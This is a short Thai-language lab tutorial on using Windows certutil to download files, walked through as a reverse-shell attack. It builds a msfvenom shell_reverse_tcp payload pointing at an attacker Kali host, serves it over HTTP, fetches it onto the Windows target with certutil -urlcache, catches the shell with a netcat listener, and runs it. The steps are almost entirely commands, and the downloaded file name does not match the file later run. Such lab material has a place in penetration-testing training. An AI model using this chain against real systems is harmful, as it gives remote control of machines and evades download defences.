# Windows Download shell via certutil tools 

บน Windows เราสามารถใช้คำสั่ง certutil เพื่อดาวโหลดไฟล์ได้ ซึ่งจะคล้ายกับการใช้งาน Wget บน Linux นั่นเอง 

```powershell
certutil.exe -urlcache -f http://10.10.10.2/downloadfile.exe
# OR
certutil.exe -urlcache -f -split http://10.10.10.2/downloadfile.exe
```
จากตัวอย่างด้านบนเราสามารถทดสอบการโจมตีบน Windows ได้ดังต่อไปนี้
กำหนดให้ Windows มีหมายเลข IP เป็น 10.10.10.1 และ Kali Linux เป็น 10.10.10.2 

Step 1: สร้าง Payload ในรูปแบบไฟล์ .exe ด้วย msfvenom

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.2 LPORT=4444 -f exe > shell.exe
```

Step 2: เปิดให้ Download file ด้วยคำสั่ง Python
```python
python -m http.server 80
```

Step 3: Remote ไปยัง Windows ด้วยคำสั่ง xfreerdp
```sh 
xfreerdp /u:user /p:pass /cert:ignore /v:10.10.10.1
```

Step 4: ทำการ Dwonload ไฟล์ shell.exe บน Windows 
```powershell
certutil.exe -urlcache -f http://10.10.10.2/downloadfile.exe
# OR
certutil.exe -urlcache -f -split http://10.10.10.2/downloadfile.exe
```

Step 5: เปิด Connection ด้วย Netcat บน Kali เพื่อรอ Reverse shell 
```sh 
nc -lvnp 4444 
```

Step 6: Run shell.exe บน Windows 
```powershell
./shell.exe
```

Have FUN for LAB